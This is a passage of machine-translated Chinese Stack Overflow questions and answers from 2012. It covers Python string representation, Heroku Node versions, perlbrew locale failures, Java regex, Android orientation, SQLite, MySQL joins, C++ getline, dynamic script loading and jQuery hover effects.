    console.log(p);
}
phantom.exit();
}); 
```

# python - 字符串表示中的双引号

> ID：11917043
> 
> 赞同：10
> 
> 时间：2012-08-11T19:33:17.920
> 
> 标签：python, python-2.7

这个片段：

```
formatter = "%r %r %r %r"
print formatter % (
    "I had this thing.",
    "That you could type up right.",
    "But it didn't sing.",
    "So I said goodnight."
) 
```

运行时，打印此字符串：

```
'I had this thing.' 'That you could type up right.' "But it didn't sing." 'So I said goodnight.' 
```

当其他三个项目在单引号中时，为什么`"But it didn't sing."`会被放在双引号中？

（此代码取自[Learn Python the Hard Way 练习 8。](http://learnpythonthehardway.org/book/ex8.html)）

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-11T19:40:53.247

Python很聪明；在生成表示时，它将对包含单引号的字符串使用双引号，以尽量减少转义：

```
>>> 'no quotes'
'no quotes'
>>> 'one quote: \''
"one quote: '" 
```

在那里添加一个双引号，它将恢复为单引号并转义包含的任何单引号*：*

```
>>> 'two quotes: \'\"'
'two quotes: \'"' 
```

# node.js - Heroku 在 NodeJS 中“找不到模块 zlib”

> ID：11917048
> 
> 赞同：0
> 
> 时间：2012-08-11T19:35:02.697
> 
> 标签：node.js, heroku, express

我认为这是我使用的 NodeJS 版本的问题，但我无法找到实际问题和解决方案。这是heroku日志：

```
 2012-08-11T19:25:48+00:00 heroku[web.1]: Starting process with command
 `node app.js` 2012-08-11T19:25:49+00:00 app[web.1]: 
 2012-08-11T19:25:49+00:00 app[web.1]: node.js:134
 2012-08-11T19:25:49+00:00 app[web.1]:         throw e; //
 process.nextTick error, or 'error' event on first tick
 2012-08-11T19:25:49+00:00 app[web.1]: Error: Cannot find module 'zlib'
 2012-08-11T19:25:49+00:00 app[web.1]:         ^
 2012-08-11T19:25:49+00:00 app[web.1]:     at Function._load
 (module.js:266:25) 2012-08-11T19:25:49+00:00 app[web.1]:     at
 Function._resolveFilename (module.js:320:11) 2012-08-11T19:25:49+00:00
 app[web.1]:     at require (module.js:348:19)
 2012-08-11T19:25:49+00:00 app[web.1]:     at Object.<anonymous>
 (/app/node_modules/express/node_modules/connect/lib/middleware/compress.js:14:12)
 2012-08-11T19:25:49+00:00 app[web.1]:     at Module._compile
 (module.js:404:26) 2012-08-11T19:25:49+00:00 app[web.1]:     at
 Module.load (module.js:336:31) 2012-08-11T19:25:49+00:00 app[web.1]:  
 at Object..js (module.js:410:10) 2012-08-11T19:25:49+00:00 app[web.1]:
 at require (module.js:348:19) 2012-08-11T19:25:49+00:00 app[web.1]:   
 at Object.compress
 (/app/node_modules/express/node_modules/connect/lib/connect.js:89:14)
 2012-08-11T19:25:49+00:00 app[web.1]:     at Function._load
 (module.js:297:12) 2012-08-11T19:25:50+00:00 heroku[web.1]: Process
 exited with status 1 2012-08-11T19:25:50+00:00 heroku[web.1]: State
 changed from starting to crashed 2012-08-11T19:25:50+00:00
 heroku[web.1]: State changed from crashed to starting
 2012-08-11T19:25:52+00:00 heroku[web.1]: Starting process with command
 `node app.js` 2012-08-11T19:25:53+00:00 app[web.1]: 
 2012-08-11T19:25:53+00:00 app[web.1]: node.js:134
 2012-08-11T19:25:53+00:00 app[web.1]:         throw e; //
 process.nextTick error, or 'error' event on first tick
 2012-08-11T19:25:53+00:00 app[web.1]:         ^
 2012-08-11T19:25:53+00:00 app[web.1]: Error: Cannot find module 'zlib'
 2012-08-11T19:25:53+00:00 app[web.1]:     at Function._resolveFilename
 (module.js:320:11) 2012-08-11T19:25:53+00:00 app[web.1]:     at
 Function._load (module.js:266:25) 2012-08-11T19:25:53+00:00
 app[web.1]:     at require (module.js:348:19)
 2012-08-11T19:25:53+00:00 app[web.1]:     at Object.<anonymous>
 (/app/node_modules/express/node_modules/connect/lib/middleware/compress.js:14:12)
 2012-08-11T19:25:53+00:00 app[web.1]:     at Module._compile
 (module.js:404:26) 2012-08-11T19:25:53+00:00 app[web.1]:     at
 Object..js (module.js:410:10) 2012-08-11T19:25:53+00:00 app[web.1]:   
 at Module.load (module.js:336:31) 2012-08-11T19:25:53+00:00
 app[web.1]:     at Function._load (module.js:297:12)
 2012-08-11T19:25:53+00:00 app[web.1]:     at require
 (module.js:348:19) 2012-08-11T19:25:53+00:00 app[web.1]:     at
 Object.compress
 (/app/node_modules/express/node_modules/connect/lib/connect.js:89:14) 
```

这是我的`package.json`：

```
{
     "name": "App"   , "version": "0.0.1"   , "private": true   , "dependencies": {
       "express": "2.5.8"
     , "jade": ">= 0.0.1"   } 
} 
```

我的本地机器上有节点 v0.6.13 并且正在使用它。我应该在我的 中声明一个节点版本`package.json`吗？哪个版本缓解了这个`zlib`问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-12T19:31:18.840

我不知道 Heroku 上节点的默认版本是什么，但我认为它已经坏了。我强迫 Heroku 使用我正在使用的 Node.js 版本并且它有效：

```
{
    "name": "FriendButler"
  , "version": "0.0.1"
  , "private": true
  , "dependencies": {
      "express": "2.5.8"
    , "jade": ">= 0.0.1"
  }
  , "engines": {
      "node": "0.6.13",
      "npm": "1.1.41"
  }
} 
```

# osx-mountain-lion - 在 OSX 10.8.0 上使用 perlbrew 安装 perl 5.14.2 时遇到问题

> ID：11917050
> 
> 赞同：3
> 
> 时间：2012-08-11T19:35:11.123
> 
> 标签：osx-mountain-lion, perlbrew

根据我在这里和其他地方阅读的建议，我决定停止运行**sudo cpan**，从而影响系统 perl，而是使用 perlbrew 来安装和管理 perl 的私有版本。

我安装了**perlbrew**并运行了**perlbrew install perl-5.14.2**，没有和有**--force**。两次都安装失败。以下是测试总结报告。

```
Test Summary Report
-------------------
../ext/POSIX/t/posix.t                            (Wstat: 0 Tests: 66 Failed: 0)
  TODO passed:   11
../lib/locale.t                                   (Wstat: 0 Tests: 117 Failed: 1)
  Failed test:  99
Files=2089, Tests=455813, 723 wallclock secs (55.63 usr  8.56 sys + 402.42 cusr 50.30 csys = 516.91 CPU)
Result: FAIL 
```

有没有人成功使用 perlbrew 在 OSX 10.8 上安装 Perl，谁能提出问题所在？

[更新]

我尝试安装 perl 5.12.4，得到了相同的结果。以下是一些似乎与语言环境有关的细节：

```
 The following locales
#
#   C C POSIX POSIX af_ZA af_ZA.ISO8859-1 af_ZA.ISO8859-15
#   af_ZA.UTF-8 am_ET am_ET.UTF-8 be_BY be_BY.CP1131 be_BY.CP1251
#   be_BY.ISO8859-5 be_BY.UTF-8 bg_BG bg_BG.CP1251 bg_BG.UTF-8
#   ca_ES ca_ES.ISO8859-1 ca_ES.ISO8859-15 ca_ES.UTF-8 cs_CZ
#   cs_CZ.ISO8859-2 cs_CZ.UTF-8 da_DK da_DK.ISO8859-1 da_DK.ISO8859-15
#   da_DK.UTF-8 de_AT de_AT.ISO8859-1 de_AT.ISO8859-15
#   de_AT.UTF-8 de_CH de_CH.ISO8859-1 de_CH.ISO8859-15
#   de_CH.UTF-8 de_DE de_DE.ISO8859-1 de_DE.ISO8859-15
#   de_DE.UTF-8 el_GR el_GR.ISO8859-7 el_GR.UTF-8 en_AU
#   en_AU.ISO8859-1 en_AU.ISO8859-15 en_AU.US-ASCII en_AU.UTF-8
#   en_CA en_CA.ISO8859-1 en_CA.ISO8859-15 en_CA.US-ASCII
#   en_CA.UTF-8 en_GB en_GB.ISO8859-1 en_GB.ISO8859-15
#   en_GB.US-ASCII en_GB.UTF-8 en_IE en_IE.UTF-8 en_NZ
#   en_NZ.ISO8859-1 en_NZ.ISO8859-15 en_NZ.US-ASCII en_NZ.UTF-8
#   en_US en_US.ISO8859-1 en_US.ISO8859-15 en_US.US-ASCII
#   en_US.UTF-8 es_ES es_ES.ISO8859-1 es_ES.ISO8859-15
#   es_ES.UTF-8 et_EE et_EE.ISO8859-15 et_EE.UTF-8 eu_ES
#   eu_ES.ISO8859-1 eu_ES.ISO8859-15 eu_ES.UTF-8 fi_FI
#   fi_FI.ISO8859-1 fi_FI.ISO8859-15 fi_FI.UTF-8 fr_BE
#   fr_BE.ISO8859-1 fr_BE.ISO8859-15 fr_BE.UTF-8 fr_CA
#   fr_CA.ISO8859-1 fr_CA.ISO8859-15 fr_CA.UTF-8 fr_CH
#   fr_CH.ISO8859-1 fr_CH.ISO8859-15 fr_CH.UTF-8 fr_FR
#   fr_FR.ISO8859-1 fr_FR.ISO8859-15 fr_FR.UTF-8 he_IL
#   he_IL.UTF-8 hi_IN.ISCII-DEV hr_HR hr_HR.ISO8859-2 hr_HR.UTF-8
#   hu_HU hu_HU.ISO8859-2 hu_HU.UTF-8 hy_AM hy_AM.ARMSCII-8
#   hy_AM.UTF-8 is_IS is_IS.ISO8859-1 is_IS.ISO8859-15
#   is_IS.UTF-8 it_CH it_CH.ISO8859-1 it_CH.ISO8859-15
#   it_CH.UTF-8 it_IT it_IT.ISO8859-1 it_IT.ISO8859-15
#   it_IT.UTF-8 ja_JP ja_JP.SJIS ja_JP.UTF-8 ja_JP.eucJP kk_KZ
#   kk_KZ.PT154 kk_KZ.UTF-8 ko_KR ko_KR.CP949 ko_KR.UTF-8
#   ko_KR.eucKR lt_LT lt_LT.ISO8859-13 lt_LT.ISO8859-4
#   lt_LT.UTF-8 nl_BE nl_BE.ISO8859-1 nl_BE.ISO8859-15
#   nl_BE.UTF-8 nl_NL nl_NL.ISO8859-1 nl_NL.ISO8859-15
#   nl_NL.UTF-8 no_NO no_NO.ISO8859-1 no_NO.ISO8859-15
#   no_NO.UTF-8 pl_PL pl_PL.ISO8859-2 pl_PL.UTF-8 pt_BR
#   pt_BR.ISO8859-1 pt_BR.UTF-8 pt_PT pt_PT.ISO8859-1 pt_PT.ISO8859-15
#   pt_PT.UTF-8 ro_RO ro_RO.ISO8859-2 ro_RO.UTF-8 ru_RU
#   ru_RU.CP1251 ru_RU.CP866 ru_RU.ISO8859-5 ru_RU.KOI8-R
#   ru_RU.UTF-8 sk_SK sk_SK.ISO8859-2 sk_SK.UTF-8 sl_SI
#   sl_SI.ISO8859-2 sl_SI.UTF-8 sr_YU sr_YU.ISO8859-2 sr_YU.ISO8859-5
#   sr_YU.UTF-8 sv_SE sv_SE.ISO8859-1 sv_SE.ISO8859-15
#   sv_SE.UTF-8 tr_TR tr_TR.ISO8859-9 tr_TR.UTF-8 uk_UA
#   uk_UA.ISO8859-5 uk_UA.KOI8-U uk_UA.UTF-8 zh_CN zh_CN.GB18030
#   zh_CN.GB2312 zh_CN.GBK zh_CN.UTF-8 zh_CN.eucCN zh_HK
#   zh_HK.Big5HKSCS zh_HK.UTF-8 zh_TW zh_TW.Big5 zh_TW.UTF-8
#
# tested okay.
#
# None of your locales were broken.
../lib/locale.t ................................................... 
Failed 1/117 subtests 
```

所以没有一个是“坏的”，但一个是“失败的”。这似乎阻止了安装成功，即使是强制安装。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T01:56:00.933

故障来自“be_BY.CP1131”语言环境的测试 99。

最终修复需要来自 Perl 开发人员或 Apple。

同时，您可以通过将 /usr/share/locale/be_BY.CP1131 移动到其他目录来进行安装。Perl 将不再测试这个语言环境。这不是一个理想的解决方案，但它会让你 perlbrew perl 假设你不需要这个特定的语言环境。

# webkit - 交互式应用程序的 Webkit 与处理

> ID：11917051
> 
> 赞同：1
> 
> 时间：2012-08-11T19:35:30.700
> 
> 标签：webkit, processing

我知道这听起来有点奇怪，但是我想编写一个非常简单的应用程序，一种独特的图像查看器，它需要在用户级别与主机系统进行一些交互。开发时必须简单，因为这是一个非常小的副项目。该项目确实需要一些图形工作和相当多的基于鼠标的交互性（以及一些键盘快捷键），但坦率地说，我不想为了这么小的东西而涉足 OGL。我查看了可用的选项，我认为我已将其缩小为两个主要选择：Webkit（通过 QtWebkit 或 WebkitGtk）和语言处理。

由于我实际上没有使用过 Processing，但我确实有一些 HTML5 画布和 Javascript 经验，所以我有点想使用基于 Webkit 的解决方案。然而，我有几个担忧。

*   Webkit 对画布的支持如何，特别是对图形密集型进程的支持？
*   我听说 QtWebkit 中的桥接比 WebkitGtk 处理得更好。这仍然是真的吗？
*   桥接实际上可以做到什么程度？基于 Webkit 的应用程序能否完成与系统文件交互的应用程序所需的一切？

看看Processing，我也想知道类似的一些事情。

*   Processing 以其图形功能而闻名，但它在编写普通的日常桌面应用程序方面的能力如何？
*   有许多来源将 Processing 与 Java 联系起来，包括沿袭以及通过 Web 分发应用程序（即：JApplets）。“应用程序导出”是否同样与 Java 紧密集成？

至于直接比较两者，我主要关心的是每个的开销。我希望应用程序尽可能快地启动，并且我知道 Java 在启动方面有一些开销，因为它首先必须启动解释器。Processing 和 QtWebkit/WebkitGtk 如何比较启动？

请注意，我只针对 Linux 平台。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T02:31:22.983

很难给出一个具体的答案，因为你实际上是在问几个不同类型的问题——其中一些你可以更准确。

Processing 是 java 的一个子集或子类——它实际上“只是”一个带有免费 ide 的 java 框架，它隐藏了构建小程序的混乱设置工作，因此用户可以潜入并快速编写一些东西而不会陷入小部件和ui等。所以处理可以自己存在，最终用户不需要了解Java（除了语法-处理是java，所以用户必须学习java语法）。

但是一个已经了解 java 的程序员可以利用处理的乐趣快速的性质，然后利用他们正常的 java 经验来满足任何其他需要 - java 的所有东西都在处理中，只是可能稍微隐藏（但只是一开始）。将 processing.jars 导入现有的 java 程序并在那里使用它们。请参阅[http://processing.org/learning/eclipse/](http://processing.org/learning/eclipse/)以获取更多信息。

“*编写一个普通的日常桌面应用程序有多大能力？* ” - 不是特别靠它自己（它不是被设计成的），但有些事情是可能的且容易的（即文件保存和加载、非标准 gui 等） ，并且在某些方面类似于老式的动作脚本或行话。有一个名为[controlP5](http://www.sojamo.de/libraries/controlP5/)的库使 gui 的东西更容易一些。

* * *

Webkit 是另一种鱼，特别是如果您不制作基于 Web 的东西（听起来您正在考虑将 webkit 库用作更大程序的一部分。我承认我没有开发这些特定库的专业知识可以为您提供您真正想要的答案，但我敢肯定，除非您有超越 html5/javascript 的编程经验，否则您的处理速度可能会快得多。

祝你好运，无论你选择哪条路！

# java - 使用java从文本文件中提取特定的url

> ID：11917057
> 
> 赞同：1
> 
> 时间：2012-08-11T19:36:05.847
> 
> 标签：java, regex, text-parsing, web-crawler

我有一个文本文档，其中有一堆表单的 url `/courses/......./.../..` ，从这些 url 中，我只想提取那些表单的 url `/courses/.../lecture-notes`。表示以 开头`/courses`和结尾的网址`/lecture-notes`。有人知道使用正则表达式或仅通过字符串匹配的好方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T19:37:32.510

这是另一种选择：

```
Scanner s = new Scanner(new FileReader("filename.txt"));

String str;
while (null != (str = s.findWithinHorizon("/courses/\\S*/lecture-notes", 0)))
    System.out.println(str); 
```

* * *

给定一个`filename.txt`与内容

```
Here /courses/lorem/lecture-notes and
here /courses/ipsum/dolor/lecture-notes perhaps. 
```

上面的片段打印

```
/courses/lorem/lecture-notes
/courses/ipsum/dolor/lecture-notes 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T19:42:32.943

假设您每行有 1 个 URL，可以使用：

```
 BufferedReader br = new BufferedReader(new FileReader("urls.txt"));
    String urlLine;
    while ((urlLine = br.readLine()) != null) {
        if (urlLine.matches("/courses/.*/lecture-notes")) {
            // use url
        }
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T19:48:49.893

以下将**只**返回中间部分（即：排除`/courses/`和`/lectures-notes/`：

```
Pattern p = Pattern.compile("/courses/(.*)/lectures-notes");
Matcher m = p.matcher(yourStrnig);

if(m.find()).
  return m.group(1) // The "1" here means it'll return the first part of the regex between parethesis. 
```

# android - 解决屏幕方向更改的两个具体问题（Android）

> ID：11917072
> 
> 赞同：1
> 
> 时间：2012-08-11T19:37:48.233
> 
> 标签：android, screen-orientation

我知道你可以使用这个： android:configChanges="orientation" 来消除方向变化的重绘。虽然它不在我的应用程序中。我读过可能有一种方法需要您覆盖它才能使其工作。但我认为这可能是矫枉过正。

当我将屏幕从纵向旋转到横向（或以其他方式）时，只有两个我不想发生的问题。

1.  如果用户触摸 EditText，则会弹出键盘。你改变方向，它会自动隐藏。我想随身携带软键盘。

2.  我有一个从 MySQL 数据库填充的 ListView 加载数据。它通过一个 AsynTask 来做到这一点。当我切换方向时，我不希望调用此任务。

**我可以隔离这两个问题，还是第一个选项（configChanges）是答案？**

注意：其中一些是列表活动；但最大的是一个带有 Viewpager 的 FragmentActivity，以及一个 Fragment / ListFRagment（带标签）内部类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:59:27.770

当方向改变时，Activity 被销毁并重新创建。`configChanges`如果使用is ，您将覆盖的方法`onConfigurationChanged`。

对于键盘问题，听起来您只需要跟踪它的状态并通过`Bundle`传入的`Activity.onCreate`.

对于第二个问题，您可以检查是否`onSavedInstanceState == null`确定是否需要运行`AsyncTask`. 您需要将任何数据保存`Bundle`到`onPause`.

# c - 将 zSql arg 释放到 sqlite3_prepare_v2？

> ID：11917073
> 
> 赞同：0
> 
> 时间：2012-08-11T19:38:01.790
> 
> 标签：c, sqlite, free

如果我有一个动态分配的字符串，其中包含我要传递给 sqlite3_prepare_v2() 的查询，那么何时可以安全地释放该字符串？紧接在 sqlite3_prepare_v2() 之后？sqlite3_step 完成后？直到 sqlite3_finalize() 之后？nByte 参数的值会影响答案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:22:46.693

从[文档](http://www.sqlite.org/c3ref/prepare.html)中：

> 建议所有新程序使用 sqlite3_prepare_v2() 和 sqlite3_prepare16_v2() 接口。保留两个较旧的接口是为了向后兼容，但不鼓励使用它们。在“v2”接口中，返回的准备好的语句（sqlite3_stmt 对象）**包含**原始 SQL 文本的副本。

我相信这意味着您可以在调用`sqlite3_prepare_v2()`.

**编辑：**

沿着代码进行的短途旅行`sqlite3.c`揭示了这个小片段：

```
SQLITE_PRIVATE void sqlite3VdbeSetSql(Vdbe *p, const char *z, int n, int isPrepareV2){
  assert( isPrepareV2==1 || isPrepareV2==0 );
  if( p==0 ) return;
#ifdef SQLITE_OMIT_TRACE
  if( !isPrepareV2 ) return;
#endif
  assert( p->zSql==0 );
  p->zSql = sqlite3DbStrNDup(p->db, z, n);
  p->isPrepareV2 = (u8)isPrepareV2;
} 
```

基本上，如果这是由 调用的`sqlite3_prepare_v2()`，则调用一个版本`strndup()`来创建字符串的副本...

# php - MySQL查询从5个表中获取数据？

> ID：11917080
> 
> 赞同：-1
> 
> 时间：2012-08-11T19:39:22.213
> 
> 标签：php, mysql

什么是正确的 MySQL 查询？这就是我想要实现的目标。

1.  我想显示所有状态更新条目、发布日期、发布者用户名、性别、城市和标签
2.  我想显示 user_id='1' 的成员的所有状态更新条目、状态更新发布的日期、发布者用户名、性别、城市和成员在其个人资料中的标签
3.  以及如何在一行中显示用户在其个人资料中的所有标签，并用“，”分隔？我之前尝试过 group_concat ，但我无法让它工作。请帮忙。

这是我的桌子

```
STATUS_UPDATE Table
+------------------------------------------------------+
| status_id | user_id |      body       |  postdate    |
+-----------+---------+-----------------+--------------+
| 1         |   1     | hello world     | Aug 12, 2012 |
+-----------+---------+-----------------+--------------+
| 2         |   1     | i miss you      | Aug 13, 2012 |
+-----------+---------+-----------------+--------------+
| 3         |   2     | lorem ipsum     | Aug 14, 2012 |
+-----------+---------+-----------------+--------------+
| 4         |   2     | why me? why?    | Aug 14, 2012 |
+-----------+---------+-----------------+--------------+

MEMBERS Table    //Primary data of members
+---------------------------------------------------+
| user_id | username |  password  |   email         |
+---------+----------+------------+-----------------+
|    1    | john_doe |  qwerty    | john@doe.com    |
+---------+----------+------------+-----------------+
|    2    | maryjane |  pass123   | mary@jane.com   |
+---------+----------+------------+-----------------+

MEMBERS_DATA Table   //Profile Fields
+----------------------------------------------+
| user_id | gender |  description  |   city    |
+---------+--------+---------------+-----------+
|    1    | male   |  i am simple  | chicago   |
+---------+--------+---------------+-----------+
|    2    | female |  i am flirty  | newyork   |
+---------+--------+---------------+-----------+

MEMBERS_TAGS Table   //tags that members added to their profiles
+-------------------+
| user_id | item_id |
+---------+---------+
|  1      |  555    |
+---------+---------+
|  1      |  666    |
+---------+---------+
|  1      |  7777   |
+---------+---------+
|  2      |  8888   |
+---------+---------+

TAGS Table    //the info of the tags
+------------------------------+
| item_id | cat_id |  name     |
+---------+--------+-----------+
| 555     |   5    |  sexy     |
+---------+--------+-----------+
| 666     |   5    |  beauty   |
+---------+--------+-----------+
| 7777    |   6    |  music    |
+---------+--------+-----------+
| 8888    |   6    |  movies   |
+---------+--------+-----------+

CATEGORY Table   //the category of the tags
+-------------------------+
| cat_id  | category_name |
+---------+---------------+
| 5       |  appearance   |
+---------+---------------+
| 6       |  hobbies      |
+---------+---------------+ 
```

顺便说一句，我正在使用 PHP 进行编码，我要提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T13:39:06.827

```
SELECT 
      STATUS_UPDATE.* ,
      MEMBERS.username ,
      MEMBERS_DATA.gender ,
      MEMBERS_DATA.city
      TAGS.*
FROM  UPDATE
LEFT JOIN MEMBERS ON MEMBERS.user_id = STATUS_UPDATE.user_id
LEFT JOIN MEMBERS_DATA ON MEMBERS_DATA.user_id = STATUS_UPDATE.user_id
LEFT JOIN MEMBERS_TAGS ON MEMBERS_TAGS.user_id = STATUS_UPDATE.user_id
LEFT JOIN TAGS ON TAGS.item_id = MEMBERS_TAGS.item_id 
```

# c++ - C++：使用带有 cin.getline() 的指针

> ID：11917081
> 
> 赞同：3
> 
> 时间：2012-08-11T19:39:24.867
> 
> 标签：c++, arrays, string, pointers, cin

我有这个不工作的程序。

```
char arr[200] ;
char *p = arr;
cout << "Enter the string and press ENTER: ";
cin.getline(*p,200); 
```

问题可能是因为我使用带有 cin.getline() 的指针。

我的问题是

是否可以在 cin.getline 中使用指针？

如果是的话。那怎么办？

如果没有。那为什么不呢，以及如何解决这个问题（尤其是把字符串传递给函数）？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-11T19:41:27.513

是的，有可能，你只是语法错误。

```
cin.getline(p,200); 
```

istream::getline 需要一个指针，因此无需像您那样取消引用它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T19:41:38.030

```
cin.getline(*p,200); 
```

`*p`是类型`char`。您正在取消引用指向 的指针`char`，因此您又得到了`char`返回。你没有传递一个指针。只需传入`p`：

```
cin.getline(p, 200); 
```

# javascript - 将javascript返回值插入html

> ID：11917086
> 
> 赞同：1
> 
> 时间：2012-08-11T19:39:56.063
> 
> 标签：javascript, html, ajax

我创建了一个 JavaScript 函数，它将返回包含 2 个 URL 的数据。我想将这些插入到 HTML 代码中。

例如，返回 URL 值是

JavsScript 文件

```
http://www.domain.com/javascript.js 
```

CSS 文件

```
http://www.domain.com/buttons.css 
```

我需要将这些插入代码中：

```
<link rel="stylesheet" type="text/css" href="return URL value" />
<script type="text/javascript" src="return URL value"></script> 
```

我怎样才能做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:46:46.740

下面从[http://www.javascriptkit.com/javatutors/loadjavascriptcss.shtml获得的片段中建议了您可以执行此操作的一种方法](http://www.javascriptkit.com/javatutors/loadjavascriptcss.shtml)

* * *

动态加载 .js 或 .css 文件，简而言之，这意味着使用 DOM 方法首先创建一个时髦的新“SCRIPT”或“LINK”元素，为其分配适当的属性，最后使用 element.appendChild()将元素添加到文档树中的所需位置。这听起来比实际上要花哨得多。让我们看看这一切是如何结合在一起的：

```
function loadjscssfile(filename, filetype){
 if (filetype=="js"){ //if filename is a external JavaScript file
  var fileref=document.createElement('script')
  fileref.setAttribute("type","text/javascript")
  fileref.setAttribute("src", filename)
 }
 else if (filetype=="css"){ //if filename is an external CSS file
  var fileref=document.createElement("link")
  fileref.setAttribute("rel", "stylesheet")
  fileref.setAttribute("type", "text/css")
  fileref.setAttribute("href", filename)
 }
 if (typeof fileref!="undefined")
  document.getElementsByTagName("head")[0].appendChild(fileref)
}

loadjscssfile("myscript.js", "js") //dynamically load and add this .js file
loadjscssfile("javascript.php", "js") //dynamically load "javascript.php" as a JavaScript file
loadjscssfile("mystyle.css", "css") ////dynamically load and add this .css file 
```

* * *

显然，您需要将其调整为您自己的代码，因为您没有提供`js`您使用的实际代码。但基本上，当您获得 2 时，您将需要调用该`loadjscssfile()`函数两次`URL`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T19:47:42.953

您可以使用 javascript 动态加载外部 css（以及 js）文件。只需`<link>`使用 javascript 创建适当的元素。

```
var url  = computeUrl();                      /* Obtain url               */
var link = document.createElement('link');    /* Create the link element  */
    link.setAttribute('rel', 'stylesheet');   /* Set the rel attribute    */
    link.setAttribute('type', 'text/css');    /* Set the type attribute   */
    link.setAttribute('href', url);           /* Set the href to your url */ 
```

目前，我们刚刚创建了元素

```
<link rel="stylesheet" type="text/css" href="your url"> 
```

我们已经将它存储在变量中`var link`。它还没有结束，`<link>`还不是现在的一部分`DOM`。我们需要附加它

```
var head = document.getElementsByTagName('head')[0]; /* Obtain the <head> element      */
head.appendChild(link);                              /* Append link at the end of head */ 
```

它已经完成了。

以非常相似的方式，您可以动态添加外部 javascript 资源。只需使用`<script>`标签而不是`<link>`标签。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T19:47:31.060

您可以使用 javascript 轻松地将节点添加到 head 元素：

```
link=document.createElement('link');
link.href= your_css_href_function();
link.rel='stylesheet';
link.type='text/css';

document.getElementsByTagName('head')[0].appendChild(link); 
```

您的 javascript 标签也是如此：

```
script=document.createElement('script');
script.src= your_javascript_src_function();
script.type='text/javascript';

document.getElementsByTagName('head')[0].appendChild(script); 
```

# javascript - 悬停时动画不透明度变化不起作用

> ID：11917092
> 
> 赞同：0
> 
> 时间：2012-08-11T19:40:45.957
> 
> 标签：javascript, jquery, html, css

我想在用户悬停元素时显示一个 div。我希望当您将鼠标悬停在名为 distinct 的 div 上时，div 类 prod-desc 将其不透明度更改为 1。

请帮助我，谢谢你！

这是HTML：

```
<section id="distinguished" class="four columns"> <a class="dist-img" href="#"  alt="" border="0" > <img src="images/e1.png" onClick="window.location='@Url.Action("Details", "Item", new { id = section["Id"], storeid = section["PortalId"], name = section["ProductTitle"] })'"/> </a>
  <div class="descContent">
    <div class="distinguished-bar"> <a class="categoryMain" href="@Url.Action("Details", "Item", new { id = section["Id"], storeid = section["PortalId"], name = section["ProductTitle"] })'"></a> <a class="btAdd" href="#" title="ADD"><span class="iconAdd"></span>
      <p>ADD</p>
      </a> </div>
    <div class="infoContent">
      <div class="prod-desc ">
        <p>Category</p>
        <p>Title</p>
        <p>Description</p>
      </div>
      <div class="prod-price">
        <div>
          <p class="priceTitle">Precio</p>
          <span class="priceRegular">$300</span></div>
      </div>
      <div class="buttonsBox"> <a class="btAddLarge hom2" id="addToCart" href="/Cart/AddToCart">
        <p>@this.Message("Add")</p>
        </a> </div>
    </div>
  </div>
</section> 
```

这是jQuery：

```
$('.prod-desc').hover(function () {
    $('.prod-desc', this).stop().animate({
        "opacity": 1
    });
}, function () {
    $('.prod-desc', this).stop().animate({
        "opacity": 0
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:49:21.423

尝试使用[`mouseover`](http://api.jquery.com/mouseover/)and[`mouseleave`](http://api.jquery.com/mouseleave/)代替：

```
$('.prod_desc').mouseover(function() {
    $(this).stop().clearQueue().animate({
        "opacity": 1
});
$('.prod_desc').mouseleave(function() {
        $(this).stop().clearQueue().animate({
            "opacity": 0
        });
    });
});​ 
```

你可以在这个小提琴中看到它的作用：http: [//jsfiddle.net/svNpQ/3/](http://jsfiddle.net/svNpQ/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T19:48:40.997

这很简单，只需在您的代码中使用：

```
 $('#distinguished').hover(function() { 
    $('.prod-desc').animate({"opacity": 1}); 
 }); 
```

这是示例：[jsFiddle Demo](http://jsfiddle.net/uqfrS/)

在您的情况下，您必须通过 id 引用元素，即*'distinguished'*。然后，您定义悬停动作并在函数内部指定哪个元素和要做什么，在您的情况下*'.prod-desc'* animate (change css property) to *1*。

*请记住将.prod-desc*的初始 css 不透明度属性设置为低于*1*的值以查看差异。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T19:56:25.710

定位您希望将事件处理程序附加到的元素，而不是具有淡入淡出效果的元素：

```
$('#distinguished').hover(function() { 
    $('.prod-desc', this).stop().animate({"opacity": 1}); 
},function() { 
    $('.prod-desc', this).stop().animate({"opacity": 0}); 
});​ 
```

[小提琴](http://jsfiddle.net/acHGq/)

# wpf - 绑定到 ObservableCollection 的副本

> ID：11917100
> 
> 赞同：0
> 
> 时间：2012-08-11T19:42:25.797
> 
> 标签：wpf, data-binding, observablecollection

我有一个绑定到[DataGrid的](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid%28v=vs.100%29.aspx)[ObservableCollection](http://msdn.microsoft.com/en-us/library/ms668604%28v=vs.100%29.aspx)，一切正常。我想在不重复访问数据库的情况下过滤集合，所以我决定使用支持集合来存储原始列表，然后将过滤后的列表公开暴露给绑定。所以我有以下代码：

```
_backingMemberList.Clear();
_memberList.Clear();

foreach (Member CurrentMember in ListOfMembers)
{
    _memberList.Add(CurrentMember);
    _backingMemberList.Add(CurrentMember);
}

_memberList = new ObservableCollection<Member>(_backingMemberList); 
```

绑定很简单：

```
<DataGrid Name="dataGridMembers" ItemsSource="{Binding MemberList}" /> 
```

现在，由于某种原因，这打破了 RowStyle

```
<DataGrid.RowStyle>
    <Style TargetType="DataGridRow">
        <Setter Property="Background">
            <Setter.Value>
